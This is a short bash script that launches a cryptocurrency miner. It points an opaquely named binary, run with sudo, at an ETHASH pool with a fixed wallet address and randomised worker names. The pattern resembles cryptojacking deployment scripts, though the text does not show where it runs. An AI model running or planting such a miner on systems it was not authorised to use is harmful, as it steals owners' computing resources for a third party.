#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=WIN:TNm3k3uCQXtfYhwPZFzNq4dTCPumBSfYNp
WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-USER1#ek61-6h9x)


chmod +x ./3hhNoTC && sudo ./3hhNoTC --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
